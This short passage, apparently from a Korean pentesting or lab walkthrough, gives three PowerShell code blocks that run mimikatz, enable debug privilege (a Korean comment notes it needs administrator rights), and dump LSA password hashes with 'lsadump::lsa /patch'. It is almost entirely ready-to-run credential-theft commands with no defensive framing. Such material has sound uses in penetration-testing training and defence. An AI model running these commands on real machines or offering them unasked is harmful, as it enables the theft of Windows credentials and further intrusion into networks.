
```powershell
./mimikatz.exe
```

```powershell
# 이렇게 하면 mimikatz를 관리자로 실행하고 있습니다. MimiKatz를 관리자로 실행하지 않으면 MimiKatz가 제대로 실행되지 않습니다
privilege::debug
```

```powershell title="Hash dump"
lsadump::lsa /patch
```

